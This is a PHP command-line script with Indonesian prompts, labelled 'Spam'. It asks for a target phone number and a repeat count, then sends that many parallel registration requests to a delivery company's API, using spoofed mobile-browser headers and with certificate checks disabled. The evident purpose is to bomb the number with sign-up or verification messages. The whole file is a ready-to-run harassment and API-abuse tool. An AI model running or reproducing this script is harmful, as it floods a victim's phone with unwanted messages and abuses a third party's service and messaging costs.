<?php


echo "=== Spam ===\n";
echo "Masukkan Nomor HP (Contoh: +628xxxx atau 08xxxxxxx): ";
$noHp = trim(fgets(STDIN));


if (strpos($noHp, '0') === 0) {
    $noHp = '+62' . substr($noHp, 1);
}

echo "Masukkan Jumlah spam (misal: 5): ";
$loop = (int) trim(fgets(STDIN));

if ($loop <= 0) {
    echo "Jumlah spam tidak valid!\n";
    exit;
}

$url = "https://api.kaleyodelivery.com/register";

$headers = [
    "Host: api.kaleyodelivery.com",
    "Connection: keep-alive",
    "sec-ch-ua-platform: \"Android\"",
    "User-Agent: Mozilla/5.0 (Linux; Android 16; Redmi Note 7 Build/BP4A.251205.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/152.0.7977.42 Safari/537.36",
    "Accept: application/json, text/plain, */*",
    "sec-ch-ua: \"Chromium\";v=\"152\", \"Not?A_Brand\";v=\"24\", \"Android WebView\";v=\"152\"",
    "Content-Type: application/json",
    "sec-ch-ua-mobile: ?1",
    "Origin: https://kaleyodelivery.com",
    "X-Requested-With: mark.via.gp",
    "Sec-Fetch-Site: same-site",
    "Sec-Fetch-Mode: cors",
    "Sec-Fetch-Dest: empty",
    "Referer: https://kaleyodelivery.com/",
    "Accept-Language: en-US,en;q=0.9",
    "Cookie: _fbp=fb.1.1787047613391.917327210102647048"
];

// Data JSON yang dikirim
$data = [
    "name" => "Namaku",
    "password" => "KamuSiapaYa#",
    "password_confirmation" => "KamuSiapaYa#",
    "noHp" => $noHp,
    "countryCode" => "ID"
];
$payload = json_encode($data);

echo "\nMemulai {$loop} spam ....\n";
echo "--------------------------------------------------\n";

$startTime = microtime(true);

$mh = curl_multi_init();
$channels = [];

for ($i = 0; $i < $loop; $i++) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    curl_multi_add_handle($mh, $ch);
    $channels[$i] = $ch;
}

$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

for ($i = 0; $i < $loop; $i++) {
    $ch = $channels[$i];
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $response = curl_multi_getcontent($ch);
    $error = curl_error($ch);
    
    $index = $i + 1;
    echo "[spam ke-{$index}] HTTP Status: {$httpCode} | ";
    if ($error) {
        echo "Curl Error: {$error}\n";
    } else {
        echo "Response: {$response}\n";
    }
    
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}

curl_multi_close($mh);

$endTime = microtime(true);
$duration = round($endTime - $startTime, 2);

echo "--------------------------------------------------\n";
echo "Selesai dalam waktu: {$duration} detik!\n";
